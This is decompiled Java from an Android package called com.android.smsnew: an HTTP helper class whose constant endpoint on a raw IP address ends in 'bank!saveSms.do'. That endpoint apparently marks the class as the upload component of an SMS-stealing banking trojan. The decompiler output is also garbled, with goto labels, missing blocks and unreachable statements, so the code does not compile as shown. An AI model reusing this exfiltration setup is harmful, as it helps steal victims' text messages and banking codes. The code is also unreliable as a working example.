// Decompiled by Jad v1.5.8e. Copyright 2001 Pavel Kouznetsov.
// Jad home page: http://www.geocities.com/kpdus/jad.html
// Decompiler options: packimports(3) 

package com.android.smsnew;

import java.io.*;
import java.nio.charset.Charset;
import java.util.*;
import org.apache.commons.io.IOUtils;
import org.apache.commons.lang3.StringUtils;
import org.apache.http.*;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.entity.mime.MultipartEntity;
import org.apache.http.entity.mime.content.*;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.util.EntityUtils;

public class HttpClientUtils
{

    public HttpClientUtils()
    {
    }

    public static String post(String s, String s1)
    {
        StringBuffer stringbuffer;
        HttpPost httppost;
        stringbuffer = new StringBuffer();
        httppost = new HttpPost(s);
        DefaultHttpClient defaulthttpclient;
        httppost.setEntity(new StringEntity(s1.toString(), "UTF-8"));
        defaulthttpclient = new DefaultHttpClient();
        HttpResponse httpresponse;
        StatusLine statusline;
        httpresponse = defaulthttpclient.execute(httppost);
        statusline = httpresponse.getStatusLine();
        stringbuffer.append((new StringBuilder("\nstatus:")).append(statusline).append("\nrps:\n").toString());
        if(200 != statusline.getStatusCode()) goto _L2; else goto _L1
_L1:
        HttpEntity httpentity = httpresponse.getEntity();
        if(httpentity != null) goto _L4; else goto _L3
_L3:
        String s3 = null;
_L5:
        stringbuffer.append((new StringBuilder("\nrsp:")).append(s3).append("\nrps:\n").toString());
_L2:
        return stringbuffer.toString();
_L4:
        String s2 = EntityUtils.toString(httpentity);
        s3 = s2;
          goto _L5
        ClientProtocolException clientprotocolexception;
        clientprotocolexception;
        try
        {
            clientprotocolexception.printStackTrace();
        }
        catch(UnsupportedEncodingException unsupportedencodingexception)
        {
            unsupportedencodingexception.printStackTrace();
            stringbuffer.append((new StringBuilder("\ne:")).append(unsupportedencodingexception.getMessage()).append("\n").toString());
        }
          goto _L2
        IOException ioexception;
        ioexception;
        ioexception.printStackTrace();
        stringbuffer.append((new StringBuilder("\ne:")).append(ioexception.getMessage()).append("\n").toString());
          goto _L2
    }

    public static String post1(String s, Map map)
    {
        DefaultHttpClient defaulthttpclient;
        HttpPost httppost;
        ArrayList arraylist;
        Iterator iterator;
        defaulthttpclient = new DefaultHttpClient();
        httppost = new HttpPost(s);
        arraylist = new ArrayList();
        iterator = map.entrySet().iterator();
_L5:
        if(iterator.hasNext()) goto _L2; else goto _L1
_L1:
        StringBuffer stringbuffer;
        BufferedReader bufferedreader;
        httppost.setEntity(new UrlEncodedFormEntity(arraylist, "UTF-8"));
        InputStream inputstream = defaulthttpclient.execute(httppost).getEntity().getContent();
        stringbuffer = new StringBuffer();
        bufferedreader = new BufferedReader(new InputStreamReader(inputstream));
_L3:
        String s1 = bufferedreader.readLine();
        if(s1 != null)
            break MISSING_BLOCK_LABEL_184;
        String s2 = stringbuffer.toString();
        return s2;
_L2:
        java.util.Map.Entry entry = (java.util.Map.Entry)iterator.next();
        BasicNameValuePair basicnamevaluepair = new BasicNameValuePair((String)entry.getKey(), (String)entry.getValue());
        arraylist.add(basicnamevaluepair);
        continue; /* Loop/switch isn't completed */
        stringbuffer.append(s1);
          goto _L3
        Exception exception;
        exception;
        exception.printStackTrace();
        return null;
        if(true) goto _L5; else goto _L4
_L4:
    }

    private void resultStatus(HttpResponse httpresponse)
        throws IOException
    {
        if(httpresponse.getStatusLine().getStatusCode() == 200)
        {
            InputStream inputstream = httpresponse.getEntity().getContent();
            sb.append(StringUtils.join(IOUtils.readLines(inputstream), null));
            IOUtils.closeQuietly(inputstream);
        }
    }

    private List setParams1(Map map)
    {
        ArrayList arraylist = new ArrayList();
        if(map == null)
        {
            arraylist = null;
        } else
        {
            Iterator iterator = map.keySet().iterator();
            while(iterator.hasNext()) 
            {
                String s = (String)iterator.next();
                Object obj = map.get(s);
                if(obj != null)
                    arraylist.add(new BasicNameValuePair(s, (String)obj));
            }
        }
        return arraylist;
    }

    public StringBuilder doGet(String s, Map map)
    {
        sb = new StringBuilder();
        String s1 = (new StringBuilder(String.valueOf(s))).append("?").toString();
        if(map == null) goto _L2; else goto _L1
_L1:
        Iterator iterator = map.keySet().iterator();
_L4:
        if(iterator.hasNext()) goto _L3; else goto _L2
_L2:
        httpGet = new HttpGet(s1.substring(0, -1 + s1.length()));
        System.out.println((new StringBuilder("=====request:")).append(httpGet.getURI()).toString());
        HttpResponse httpresponse = getHttpClient().execute(httpGet);
        System.out.println("=====request after");
        resultStatus(httpresponse);
        return sb;
_L3:
        String s3;
        String s2 = (String)iterator.next();
        Object obj = map.get(s2);
        s3 = (new StringBuilder(String.valueOf(s1))).append(s2).append("=").append(obj).append("&").toString();
        s1 = s3;
          goto _L4
        UnsupportedEncodingException unsupportedencodingexception;
        unsupportedencodingexception;
        unsupportedencodingexception.printStackTrace();
_L6:
        return sb;
        ClientProtocolException clientprotocolexception;
        clientprotocolexception;
        clientprotocolexception.printStackTrace();
        continue; /* Loop/switch isn't completed */
        IOException ioexception;
        ioexception;
        ioexception.printStackTrace();
        if(true) goto _L6; else goto _L5
_L5:
    }

    public StringBuilder doPost(String s, Map map)
    {
        sb = new StringBuilder();
        StringBuilder stringbuilder;
        httpPost = new HttpPost(s);
        MultipartEntity multipartentity = setParams(map);
        httpPost.setEntity(multipartentity);
        httpPost.setEntity(new UrlEncodedFormEntity(setParams1(map), "UTF-8"));
        resultStatus(getHttpClient().execute(httpPost));
        stringbuilder = sb;
        return stringbuilder;
        UnsupportedEncodingException unsupportedencodingexception;
        unsupportedencodingexception;
        unsupportedencodingexception.printStackTrace();
_L2:
        return sb;
        ClientProtocolException clientprotocolexception;
        clientprotocolexception;
        clientprotocolexception.printStackTrace();
        continue; /* Loop/switch isn't completed */
        IOException ioexception;
        ioexception;
        ioexception.printStackTrace();
        if(true) goto _L2; else goto _L1
_L1:
    }

    public HttpClient getHttpClient()
    {
        return new DefaultHttpClient();
    }

    public MultipartEntity setParams(Map map)
        throws UnsupportedEncodingException
    {
        MultipartEntity multipartentity = new MultipartEntity();
        if(map == null)
        {
            multipartentity = null;
        } else
        {
            Iterator iterator = map.keySet().iterator();
            while(iterator.hasNext()) 
            {
                String s = ((String)iterator.next()).trim();
                Object obj = map.get(s);
                if(obj != null)
                    if(obj instanceof Date)
                        multipartentity.addPart(s, new StringBody(String.valueOf(((Date)obj).getTime())));
                    else
                    if(obj instanceof InputStream)
                        multipartentity.addPart(s, new InputStreamBody((InputStream)obj, s));
                    else
                    if(obj instanceof File)
                        multipartentity.addPart(s, new FileBody((File)obj));
                    else
                    if(obj instanceof byte[])
                        multipartentity.addPart(s, new ByteArrayBody((byte[])obj, UUID.randomUUID().toString()));
                    else
                    if(obj instanceof String)
                        multipartentity.addPart(s, new StringBody((String)obj, Charset.forName("UTF-8")));
                    else
                        multipartentity.addPart(s, new StringBody((String)obj, Charset.forName("UTF-8")));
            }
        }
        return multipartentity;
    }

    public static final String msgeurl = "http://103.17.116.48:8080/newbank/newbank/bank!saveSms.do";
    private HttpGet httpGet;
    private HttpPost httpPost;
    private StringBuilder sb;
}
